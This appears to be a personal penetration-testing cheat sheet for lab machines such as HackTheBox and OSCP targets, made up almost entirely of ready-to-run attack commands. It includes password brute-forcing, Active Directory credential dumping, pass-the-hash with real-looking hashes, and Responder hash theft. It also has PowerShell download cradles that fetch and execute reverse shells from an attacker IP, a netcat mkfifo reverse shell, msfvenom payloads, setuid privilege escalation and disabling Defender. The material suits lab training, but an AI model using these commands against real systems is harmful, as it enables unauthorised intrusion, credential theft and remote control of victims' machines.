# Scanning

if ports appear wrapped with nmap add -n option
# Scan
### ping sweep
```
nmap -sn 10.11.1.0/24 -oA ping+
cat ping+.nmap | grep up -B 1 | grep for | cut -d " " -f 5  > active.txt
for i in `cat online.txt`;do mkdir $i;done
```
### Scan and find vulns
```
nmap -p- -sV -oX new.xml 10.10.10.10; searchsploit --nmap new.xml
```

# Password attacks
```
# Basic HTTP
medusa -h 10.11.1.219 -u  admin -P  password-file.txt -M  http -m DIR:/admin -T 10

# HTTP FORM
hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top100.txt 10.11.1.230 http-post-form "/goform/formLogin:Login=^USER^&Password=^PASS^:Invalid" -t 10

# RDP
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35

# SNMP
hydra -P password-file.txt -v 10.11.1.219 snmp

# SSH 
hydra -l root -P password-file.txt 10.11.1.219 ssh
```
# Enum/Exploit

### KERB
```
#find users by bruting sids
lookupsid.py   (impacket) or enum4linux
python getNPusers.py EGOTISTICALBANK/  -no-pass -usersfile users.txt
impacket-secretsdump EGOTISTICALBANK/svc_loanmgr@10.10.10.175
bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -dc 10.10.10.161 -gc htb.local
or
runas /user:domainname\username powershell.exe and sharphound.exe
# be sure to import bloodhound files into db first
aclpwn -f svc-alfresco@htb.local -d htb.local --server 10.10.10.161 -du neo4j -dp ******
```

### DNS
```dnsrecon -d 10.10.10.100 -r 10.0.0.0/8```

### SMB
#### anonymous share access
`smbmap -u anonymous -H ip`
#### crackmapexec
`crackmapexec smb 10.11.1.0/24 -u Administrator -H aad3b435b51404eeaa35b51404ee:175A592F3B0C0C5F02FAD40C51412D3A --exec-method=smbexec --local-auth` 
#### recursive all with depth 
```
smbmap -u anonymous -H 10.10.10.130 -r --depth 5 
smbmap -u USER -p PASSWORD -d DOMAIN -H ip
```

#### recursively list share contents
`smbmap -R dirname -H ip`
#### download file with certain name
`smbmap -R dirname -H ip -A Groups.xml`
#### list shares with creds
`smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100`
#### decrypt gpp password, cpassword comes from group xml
`gpp-decrypt "cpassword"`
#### Get AD users after having user creds
`GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs  # unicode errors see https://github.com/SecureAuthCorp/impacket/issues/632`

#### Get user spn # https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names !!! FIX TIME SKEW
```
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
smbclient -L //10.10.10.100   (enter if password is requested)
smbclient -U anonymous  //10.10.10.130/batshare
```

## steal smbhash when having a shell
### attacker
`responder -I tun0`
### victim
`get-content \\10.10.14.73\blablabla`
### get user hahses 
`GetNPUsers.py DOMAIN/ -usersfile ausers.txt`



### NFS
`showmount -e 10.10.10.34`


# PrivEsc
## Linux
```
#https://youtu.be/sW10TlZF62w?t=1610   NODE
#if able to run command as other user
chmod u+s on dash shell after copying it.
chown tom:admin /tmp/axano; chmod 6755 /tmp/axano # if group id is also needed
execute with dash -p
find / -perm 4000 2> /dev/null
sudo -l
linpeas
linenum
https://gtfobins.github.io/
```

## Windows
#### Searching for string in files
`grep -Ri password .`

#### bypass UAC reading
`net use Z: \\127.0.0.1\c$`

```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).String('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
whoami /priv
# if SeImpersonatePrivilege is enabled --> juicy/rotten potato
systeminfo
metasploit local_exploit_suggester --> find vulns
sherlock --> find vulns
MS16-032 --> empire --> https://github.com/EmpireProject/Empire.git --> empire/data/module_source/privesc/Invoke-MS16032.ps1 !!! BE SURE TO RUN IN X64
powerup --> empire echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerUp.ps1') | powershell -noprofile -
  Either append Invoke-Allchecks at the bottom or after execution type Invoke-AllChecks
  or cat powerup.ps1 | grep functions
    Get-RegistryAutoLogon
MS15-051 --> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
[environment]::is64bitoperatingsystem
[environment]::is64bitprocess
#If problems occure with privesc check proccess architecture and run powershell 64bit
cmd%20/c%20c:\Windows\SysNative\WindowsPowershell\v1.0\powershell%20IEX(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.73/rev.txt%27)

#create credentials object
$pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$pass)
##### following line does not work
#####start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
# run hostname
Invoke-Command -Computer ARKHAM -Credential $cred -ScriptBlock { whoami }
### hostname is very sensitive
Invoke-Command -Computer re -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt') }

#powershell suite runas 
  paste following at the bottom of the script(see bart video @ 55:36):
  Invoke-runAs -User administrator -Password 3130438f31186fbaf962f407711faddb -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -Args "IEX(new-Object Net.webclient).downloadString('http://10.10.14.73/rev1.txt')"
```

# Usefull commands
## Windows
### SHELLS
```
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
psexec.py  'user:pass@localhost' cmd 
evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```
### PTH
```
pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE //10.11.1.49 cmd.exe

```
### DOWNLOAD SHELL POWERSHELL
```
cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')  (may need to escape quotes)
AVOID BAD CHARACTERS --> convert to windows file format
iconv -t UTF-16LE | base64-w0 
powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
start-process -Filepath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/adm.txt')" -credential $cred
```

### DOWNLOAD FILE CMD/PS
```
certutil -urlcache -split -f http://10.10.14.12/priv.exe C:\\users\\public\\agent.exe #CMD
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.73/winPEAS.bat', 'C:\Users\fsmith\1.bat') # PS
Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
$client = New-Object System.Net.WebClient  # two steps is better
$client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
xcopy \\10.10.14.7\files\taskkill.exe  # from smb file server created with impacket
wget -o enum.bat http://10.10.14.73/enum.bat

# EXFIL FILES CMD/PS
certutil -encode PATH DESTINATION
```
#### enumerate folders  in powershell
```gci -recurse . | select fullname```

#### Disable defender real time scan
```Set-MpPreference -DisableRealtimeMonitoring $true```


## Linux

```
# search for rwx folders
find /path/to/file -user user1 -perm -u+rwx

# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
tcpdump -i tun0 icmp
python -m SimpleHTTPServer 80
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
impacket-smbserver files `pwd`
rlwrap nc -lvnp 51251

#monitor traffic to and from single host
iptables -I INPUT 1 -s 10.11.1.227 -j ACCEPT
iptables -I OUTPUT 1 -d 10.11.1.227 -j ACCEPT
# list consumption
iptables -vn -L
# Clear consumption
iptables -Z
```


# Web
#### dir enum
```gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```

#### LFI
https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/


# USEFULL FRAMEWORKS
## GIT
```
nishang --> https://github.com/samratashok/nishang.git
JAWS  --> enumeration https://github.com/411Hall/JAWS.git
impacket --> https://github.com/SecureAuthCorp/impacket.git
webshells --> https://github.com/BlackArch/webshells.git
sherlock --> https://github.com/rasta-mouse/Sherlock
empire --> https://github.com/EmpireProject/Empire.git
unicorn --> https://github.com/trustedsec/unicorn.git
powersploit --> https://github.com/PowerShellMafia/PowerSploit.git
powershell-suite --> https://github.com/FuzzySecurity/PowerShell-Suite
linenum --> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
peas --> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
aclpwn --> https://github.com/fox-it/aclpwn.py
lazagne --> https://github.com/AlessandroZ/LaZagne
JAWS --> https://github.com/411Hall/JAWS.git

```
## APT
```
gobuster
mdbtools
seclists
shellter + dpkg --add-architecture i386 && apt-get update && apt-get install wine32
gem install evil-winrm
pip install bloodhound
```
# VARIOUS
## Decrypt LUKS
https://www.youtube.com/watch?v=krC5j1Ab44I
https://book.hacktricks.xyz
